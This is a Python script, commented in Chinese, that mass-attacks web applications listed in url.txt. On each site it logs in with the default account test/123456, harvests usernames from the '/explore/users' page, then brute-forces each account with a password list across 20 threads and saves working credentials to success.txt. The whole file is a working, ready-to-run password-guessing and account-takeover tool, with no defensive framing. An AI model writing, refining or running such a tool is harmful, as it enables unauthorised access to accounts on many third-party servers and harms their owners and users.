import requests
from lxml import etree
import time
import threadpool


# 关闭报错信息
requests.packages.urllib3.disable_warnings()

def login(url, uname, passwd):
    data = {
        "user_name": uname,
        "password": passwd
    }
    try:
        res3 = requests.post(url + "/user/login", data=data, timeout=6, allow_redirects=False)
    except:
        print("res1报错~")
        return True  # 当次登陆失败，跳过
    if(res3.status_code == 302):
        print(url + "--" + "账号:" + uname + "--密码:" + passwd + "--登陆成功！！！")
        f = open("success.txt", "a+", encoding="utf-8")
        f.write(url + "--" + "账号:" + uname + "--密码:" + passwd + "\n")
        f.close
        return False
    else:
        # print(url+ "---" + uname + "---" + passwd + "---密码错误")
        return True


def main(url):
    unames = getuser(url)
    print(unames)
    if (unames != False): 
        passwds = []
        f = open("passwd.txt", 'r')
        for line in f.readlines():
            passwds.append(line.strip('\n'))
        f.close
        # print("开始爆破---" + url)
        for uname in unames:
            print("尝试使用" + uname +"登录--" + url)
            for passwd in passwds:
                tmp = login(url, uname, passwd)
                if (tmp):
                    pass
                else:
                    break
                # time.sleep(0.1)
    else:
        return

def getuser(url):
    data = {
      "user_name": "test",
      "password": "123456"  
    }
    res1 = requests.post(url + "/user/login", data=data, timeout=6, allow_redirects=False)
    print(res1.status_code)
    # print(res1.cookies)
    if (res1.status_code == 302):
        print("test账户登陆成功")
        cookie = res1.cookies
        res2 = requests.get(url + "/explore/users", cookies=cookie)
        tree = etree.HTML(res2.text)
        userlist=tree.xpath('//span[@class="header"]//text()')
        arr = []
        for i in userlist:
          if(i != "test" and len(i) > 1):
            arr.append(i)
        return arr
    else:
        return False


def th():
    arr = []
    f = open("url.txt", 'r')
    for line in f.readlines():
        arr.append(line.strip('\n'))
    f.close
    print("读取到"+ str(len(arr)) + "个链接，开始爆破~")
    time.sleep(0.5)
    pool = threadpool.ThreadPool(20) #建立线程池  开启20个线程
    req = threadpool.makeRequests(main, arr)  #提交N个任务到线程池
    for r in req:#开始执行任务
        pool.putRequest(r)#提交  
    pool.wait()#等待完成

 
if __name__ == "__main__":
    th()
    # doc = open('3.txt', 'a+', encoding="utf-8")
    # doc.write(res3.text)
    # doc.close